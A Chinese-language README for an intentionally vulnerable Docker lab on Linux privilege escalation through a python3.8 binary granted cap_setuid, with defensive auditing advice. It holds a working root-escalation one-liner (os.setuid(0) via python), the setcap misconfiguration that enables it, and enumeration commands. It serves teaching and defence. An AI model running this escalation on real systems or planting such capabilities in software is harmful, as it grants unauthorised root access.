# Capabilities 提权（cap_setuid）

## 原理

Linux capabilities 把 root 权限拆成独立小权限。`setcap cap_setuid+ep` 赋予程序
"修改 UID"的能力（cap_setuid）。拥有该能力的程序可以把自己的 UID 改成 0（root），
效果等同 SUID 但更隐蔽——`ls -l` 看不到 s 位，只有 `getcap` 能发现。

## 环境

- 基础镜像：ubuntu:20.04
- 低权限用户：lowpriv / lowpriv123
- 漏洞配置：`setcap cap_setuid+ep /usr/bin/python3.8`

## 复现步骤

```bash
# 1. 构建并启动
docker compose up -d --build

# 2. 进入低权限用户
docker exec -it $(docker compose ps -q) su - lowpriv

# 3. 发现 capabilities (关键枚举命令)
getcap -r / 2>/dev/null
# 预期输出: /usr/bin/python3.8 = cap_setuid+ep

# 4. 利用: python 调用 os.setuid(0)
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("id")'
# 预期输出: uid=0(root) gid=1000(lowpriv)   <- 提权成功!

# 5. 一键利用
bash exploit.sh
```

## 为什么能成功

cap_setuid 允许进程调用 setuid() 提升权限（即使进程属主不是 root）。
python 的 os.setuid(0) 直接利用该能力把 UID 改为 0。

## 注意（踩坑记录）

/usr/bin/python3 是符号链接（指向 python3.8），对 symlink 执行 setcap 无效。
必须对真实二进制设置：`setcap cap_setuid+ep /usr/bin/python3.8`。

## 防御

- `getcap -r /` 定期审计 capabilities
- 不授予解释器（python/perl/ruby）cap_setuid 等高危能力

## 验证记录

2026-08-26 真实环境验证：`/usr/bin/python3 -c 'import os; os.setuid(0); os.system("id")'`
输出 `uid=0(root)`。复现成功。
